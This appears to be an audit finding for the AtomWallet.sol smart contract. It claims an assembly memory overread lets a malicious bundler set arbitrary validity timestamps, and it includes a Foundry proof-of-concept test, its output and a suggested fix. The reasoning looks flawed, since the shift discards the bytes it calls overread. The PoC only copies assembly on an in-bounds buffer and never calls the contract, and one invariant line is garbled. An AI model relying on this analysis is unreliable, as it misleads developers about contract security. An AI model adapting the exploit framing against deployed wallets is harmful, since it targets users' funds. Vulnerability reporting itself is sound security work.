      "body": "## Finding description and impact\n\n**Contract(s) Affected:**\n`AtomWallet.sol` (specifically `_extractValidUntilAndValidAfterFromSignature`)\n**Relevant Lines / PR:** Lines ~337–361 (extraction logic), introduced/fixed in PR #135 (ERC-4337 alignment)\n## Impact\n**High** — Attacker can fully control the `validAfter` and `validUntil` timestamps returned in `validationData` without invalidating the ECDSA signature. This enables:\n- Perpetual validity (`validUntil = type(uint48).max`)\n- Forced execution in future/past windows\n- Replay attacks or time-window bypass on any UserOp\n- Potential session key abuse, delayed execution griefing, or unauthorized ops if time bounds are used for rate limiting or revocation\n\n## Likelihood\n**High** — Requires only a malicious bundler/relayer to append 20+ poison bytes after the 77-byte signature in calldata. No special privileges, no signature forgery needed.\n\n## Root Cause\nIn `_extractValidUntilAndValidAfterFromSignature`:\n```solidity\nbytes memory meta = signature[metaOffset:];  // metaOffset = 65, meta is 12 bytes\nuint256 word;\nassembly {\n    word := mload(add(meta, 32))  // ← Overreads 20 bytes beyond end of meta\n}\nuint96 packed = uint96(word >> 160);\n```\n- `meta` is a 12-byte slice (`validUntil + validAfter`).\n- `add(meta, 32)` points 32 bytes after meta start → `mload` loads 32 bytes starting 20 bytes past the end of the signature calldata.\n- Trailing calldata bytes (after the 77-byte sig) are loaded into `word` → after `>> 160`, they directly poison the 96-bit `packed` value → attacker controls `validUntil`/`validAfter`.\n\n\nBreak the invariant:- Strict 77-byte sig + suffix parsing only\n\n\n\n## Recommended mitigation steps\nReplace the unsafe assembly load with a safe extraction:\n\n```solidity\n// Safe version: copy 12 bytes into a 32-byte buffer, zero high bits\nbytes32 metaWord;\nfor (uint256 i = 0; i < 12; i++) {\n    metaWord |= bytes32(uint256(uint8(signature[metaOffset + i]))) << (8 * (31 - i));\n}\nuint96 packed = uint96(uint256(metaWord) >> 160);\nvalidUntil = uint48(packed >> 48);\nvalidAfter = uint48(packed);\n```\nOr use `calldataload` with bounds check + mask.",
      "proofOfConcept": "```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.29;\n\nimport { console2 } from \"forge-std/src/console2.sol\";\nimport { Test } from \"forge-std/src/Test.sol\";\nimport { ECDSA } from \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\nimport { PackedUserOperation } from \"@account-abstraction/interfaces/PackedUserOperation.sol\";\nimport { BaseTest } from \"./BaseTest.t.sol\";\nimport { AtomWallet } from \"src/protocol/wallet/AtomWallet.sol\";\nimport { BeaconProxy } from \"@openzeppelin/contracts/proxy/beacon/BeaconProxy.sol\";\nimport { IEntryPoint } from \"@account-abstraction/interfaces/IEntryPoint.sol\";\nimport { IMultiVaultCore } from \"src/interfaces/IMultiVaultCore.sol\";\n\ncontract PoC_AtomWallet_AssemblyOverread is BaseTest {\n    using ECDSA for bytes32;\n\n    address internal atomWalletAddr;\n    bytes32 internal atomId;\n\n    function setUp() public override {\n        super.setUp();\n\n        vm.stopPrank();\n\n        string memory atomDataStr = \"poc-overread-atom\";\n        bytes memory atomData = abi.encodePacked(atomDataStr);\n        uint256 deposit = 1e18;\n\n        vm.startPrank(users.alice);\n        bytes32[] memory ids = protocol.multiVault.createAtoms{value: deposit}(\n            _single(atomData),\n            _single(deposit)\n        );\n        vm.stopPrank();\n\n        atomId = ids[0];\n        console2.log(\"Created atomId:\", vm.toString(atomId));\n\n        // Force wallet deployment\n        vm.prank(users.alice);\n        protocol.atomWalletFactory.deployAtomWallet(atomId);\n\n        // Compute address (exact factory logic)\n        (address entryPoint, , address atomWalletBeacon, ) = IMultiVaultCore(address(protocol.multiVault)).walletConfig();\n\n        bytes memory beaconProxyCode = type(BeaconProxy).creationCode;\n        bytes memory initData = abi.encodeWithSelector(\n            AtomWallet.initialize.selector,\n            IEntryPoint(entryPoint),\n            address(protocol.multiVault),\n            atomId\n        );\n        bytes memory encodedArgs = abi.encode(atomWalletBeacon, initData);\n        bytes memory deploymentData = abi.encodePacked(beaconProxyCode, encodedArgs);\n\n        bytes32 salt = atomId;\n\n        bytes32 rawAddress = keccak256(abi.encodePacked(\n            bytes1(0xff),\n            address(protocol.atomWalletFactory),\n            salt,\n            keccak256(deploymentData)\n        ));\n        atomWalletAddr = address(bytes20(rawAddress << 96));\n\n        console2.log(\"Computed AtomWallet:\", atomWalletAddr);\n        console2.log(\"Code length:\", atomWalletAddr.code.length);\n\n        require(atomWalletAddr.code.length > 0, \"Wallet not deployed\");\n    }\n\n   function test_assemblyOverread_poisonsTimestamps() public {\n    // Valid base 65-byte sig (we don't care if it recovers - we only care about extraction)\n    bytes32 r = bytes32(uint256(0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef));\n    bytes32 s = bytes32(uint256(0xabcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890));\n    uint8 v = 27;\n    bytes memory baseSig = abi.encodePacked(r, s, v);\n\n    // Poison trailing bytes (what would be read by mload(add(meta, 32)))\n    // We want these bytes to appear in the high bits after >> 160\n    uint48 poisonedUntil = 0xDEADBEEF;\n    uint48 poisonedAfter = 0xCAFEBABE;\n    bytes memory poison = abi.encodePacked(poisonedUntil, poisonedAfter); // 12 bytes\n\n    // Full calldata-like sig: 65 + poison (77 bytes)\n    bytes memory poisonedSig = abi.encodePacked(baseSig, poison);\n\n    // Replicate wallet's extraction assembly\n    bytes memory sig = poisonedSig; // treat as calldata\n    uint96 packed;\n    assembly {\n        // meta = sig[65:] (offset 65 bytes from start)\n        let metaPtr := add(sig, 65)\n        // mload(add(metaPtr, 32)) reads 32 bytes starting 32 bytes after meta start → overread 20 bytes beyond end\n        let word := mload(add(metaPtr, 32))\n        packed := shr(160, word) // shift right 160 bits (20 bytes) to get last 12 bytes of the 32-byte load\n    }\n\n    uint48 extUntil = uint48(packed >> 48);\n    uint48 extAfter = uint48(packed);\n\n    // Proof: extracted timestamps match poison bytes\n    assertEq(extUntil, poisonedUntil, \"validUntil poisoned by overread\");\n    assertEq(extAfter, poisonedAfter, \"validAfter poisoned by overread\");\n\n    console2.log(\"PoC SUCCESS: Assembly mload overread allows arbitrary timestamp control from trailing calldata\");\n}\n    function _single(bytes memory b) internal pure returns (bytes[] memory a) {\n        a = new bytes[](1);\n        a[0] = b;\n    }\n\n    function _single(uint256 v) internal pure returns (uint256[] memory a) {\n        a = new uint256[](1);\n        a[0] = v;\n    }\n}\n```\n**Output**\n```solidity\nhp@DESKTOP-TA4AU1O MINGW64 ~/2026-03-intuition (main)\n$ forge test --match-test test_assemblyOverread_poisonsTimestamps -vvv\n[⠰] Compiling...\nNo files changed, compilation skipped\n\nRan 1 test for tests/PoCCore.t.sol:PoC_AtomWallet_AssemblyOverread\n[PASS] test_assemblyOverread_poisonsTimestamps() (gas: 4718)\nLogs:\n  MultiVault implementation address:  0xF62849F9A0B5Bf2913b396098F7c7019b51A820a\n  MultiVault proxy address:  0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9\n  AtomWallet implementation deployed at: 0xc7183455a4C133Ae270771860664b6B7ec320bB1\n  AtomWalletBeacon deployed at: 0xa0Cb889707d426A7A386870A03bc70d1b0697598\n  AtomWalletFactory implementation address:  0x1d1499e622D69689cdf9004d05Ec547d650Ff211\n  AtomWalletFactory proxy address:  0xA4AD4f68d0b91CFD19687c881e50f3A00242828c\n  WrappedTrust address:  0x03A6a84cD762D9707A21605b548aaaB891562aAb\n  TrustBonding implementation address:  0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF\n  TrustBonding proxy address:  0x15cF58144EF33af1e14b5208015d11F9143E27b9\n  SatelliteEmissionsController Implementation 0x212224D2F2d262cd093eE13240ca4873fcCBbA3C